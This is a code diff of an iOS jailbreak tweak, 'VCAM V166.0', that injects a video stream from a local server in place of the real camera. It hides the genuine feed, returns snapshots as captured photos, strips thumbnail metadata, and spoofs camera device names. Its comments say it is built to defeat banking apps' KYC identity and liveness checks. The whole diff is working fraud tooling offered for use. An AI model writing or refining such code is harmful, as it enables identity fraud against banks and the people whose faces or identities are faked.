@@ -1,4 +1,4 @@
-// VCAM V165.0: The KYC Ghost - Absolute Stealth for Banking Apps
+// VCAM V166.0: Ultimate KYC Stealth - No Leaks, No Traces
 #import <UIKit/UIKit.h>
 #import <WebKit/WebKit.h>
 #import <AVFoundation/AVFoundation.h>
@@ -9,7 +9,7 @@ static NSString *streamURL = @"http://192.168.1.44:8889/live/stream";
 static WKWebView *vcamWebView = nil;
 static UIImage *sharedSnapshot = nil;
 
-static void setup_vcam_v165(UIView *parent) {
+static void setup_vcam_v166(UIView *parent) {
     if (!parent || (vcamWebView && vcamWebView.superview == parent)) return;
     if (vcamWebView) [vcamWebView removeFromSuperview];
 
@@ -25,14 +25,14 @@ static void setup_vcam_v165(UIView *parent) {
 
     [vcamWebView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:streamURL]]];
 
-    // Nuclear CSS and JS to kill ALL player UI elements forever
-    NSString *js = @"var s = document.createElement('style'); s.innerHTML = '* { -webkit-tap-highlight-color: transparent !important; outline: none !important; } body, html, img, video { margin: 0; padding: 0; width: 100vw; height: 100vh; object-fit: cover; background: black !important; overflow: hidden !important; } video::-webkit-media-controls { display: none !important; } .vjs-control-bar, .vjs-big-play-button, .vjs-loading-spinner, button, header, footer, .controls, .play-button, .pause-indicator, [class*=\"play\"], [class*=\"pause\"], [class*=\"control\"] { display: none !important; opacity: 0 !important; visibility: hidden !important; pointer-events: none !important; }'; document.head.appendChild(s); setInterval(function(){ var v = document.querySelector('video'); if(v) { v.play(); v.controls = false; v.removeAttribute('controls'); } }, 50);";
+    // Aggressive UI removal and auto-play logic
+    NSString *js = @"var s = document.createElement('style'); s.innerHTML = '* { -webkit-tap-highlight-color: transparent !important; } body, html, img, video { margin: 0; padding: 0; width: 100vw; height: 100vh; object-fit: cover; background: black !important; overflow: hidden !important; } .vjs-control-bar, .vjs-big-play-button, .vjs-loading-spinner, .controls, .play-button, .pause-indicator { display: none !important; opacity: 0 !important; }'; document.head.appendChild(s); setInterval(function(){ var v = document.querySelector('video'); if(v) { v.play(); v.controls = false; } }, 50);";
     WKUserScript *script = [[WKUserScript alloc] initWithSource:js injectionTime:WKUserScriptInjectionTimeAtDocumentEnd forMainFrameOnly:YES];
     [vcamWebView.configuration.userContentController addUserScript:script];
 
     [parent insertSubview:vcamWebView atIndex:0];
 
-    // Snapshot loop for seamless hijacking (Increased frequency to 10fps)
+    // High-speed snapshot capture (10 FPS)
     [NSTimer scheduledTimerWithTimeInterval:0.1 repeats:YES block:^(NSTimer *t) {
         if (!enabled) return;
         [vcamWebView takeSnapshotWithConfiguration:nil completionHandler:^(UIImage *img, NSError *err) {
@@ -48,19 +48,10 @@ static void setup_vcam_v165(UIView *parent) {
         UIView *p = (UIView *)self.delegate;
         if (!p || ![p isKindOfClass:[UIView class]]) p = (UIView *)self.superlayer.delegate;
         if (p && [p isKindOfClass:[UIView class]]) {
-            setup_vcam_v165(p);
+            setup_vcam_v166(p);
             vcamWebView.frame = p.bounds;
             [p sendSubviewToBack:vcamWebView];
-            
-            AVCaptureSession *s = self.session;
-            BOOL isFront = NO;
-            if (s) {
-                for (id i in s.inputs) {
-                    if ([i isKindOfClass:objc_getClass("AVCaptureDeviceInput")] && ((AVCaptureDeviceInput *)i).device.position == 2) { isFront = YES; break; }
-                }
-            }
-            vcamWebView.transform = isFront ? CGAffineTransformMakeScale(-1, 1) : CGAffineTransformIdentity;
-            [self setOpacity:0.0];
+            [self setOpacity:0.0]; // Hide real camera feed entirely
         }
     }
 }
@@ -87,16 +78,26 @@ static void setup_vcam_v165(UIView *parent) {
     return %orig;
 }
 
-- (struct CGImage *)photoRepresentation {
-    if (enabled && sharedSnapshot) return sharedSnapshot.CGImage;
-    return %orig;
+// Prevent any thumbnail leakage in metadata
+- (NSDictionary *)metadata {
+    NSDictionary *orig = %orig;
+    if (enabled && sharedSnapshot) {
+        NSMutableDictionary *meta = [orig mutableCopy];
+        [meta removeObjectForKey:@"{Thumbnail}"];
+        return meta;
+    }
+    return orig;
 }
 %end
 
-// Hooking into live video data output for banks (Liveness Check)
-%hook AVCaptureVideoDataOutput
-- (void)setSampleBufferDelegate:(id)delegate queue:(dispatch_queue_t)queue {
-    %orig;
+// Spoof device properties for banking apps
+%hook AVCaptureDevice
+- (NSString *)localizedName {
+    return enabled ? @"Back Camera" : %orig;
+}
+
+- (NSString *)modelID {
+    return enabled ? @"iPhone Camera" : %orig;
 }
 %end
 
